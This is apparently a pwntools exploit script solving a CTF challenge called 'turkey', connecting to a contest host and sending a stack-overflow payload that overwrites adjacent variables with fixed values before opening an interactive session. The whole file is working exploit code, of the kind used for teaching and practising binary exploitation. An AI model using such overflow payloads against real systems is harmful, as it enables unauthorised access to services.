from pwn import *
import sys

#import kmpwn
sys.path.append('/home/vagrant/kmpwn')
from kmpwn import *
#fsb(width, offset, data, padding, roop)

#config
context(os='linux', arch='i386')
context.log_level = 'debug'

FILE_NAME = "./turkey"
HOST = "challenges.auctf.com"
PORT = 30011

if len(sys.argv) > 1 and sys.argv[1] == 'r':
	conn = remote(HOST, PORT)
else:
	conn = process(FILE_NAME)

#elf = ELF(FILE_NAME)
#libc = ELF('./')
#
#main_addr = elf.symbols["main"]
#libc_binsh = next(elf.search("/bin/sh"))
#addr_bss = elf.bss()
#addr_dynsym = elf.get_section_by_name('.dynsym').header['sh_addr']

def exploit():
	padding = 0x10
	payload = "A"*padding
	payload += p32(0x2a)
	payload += p32(0)
	payload += p32(0x667463)
	payload += p32(0)
	payload += p32(0x1337)
	conn.recv(1024)
	conn.sendline(payload)
	conn.interactive()	

if __name__ == "__main__":
	exploit()	
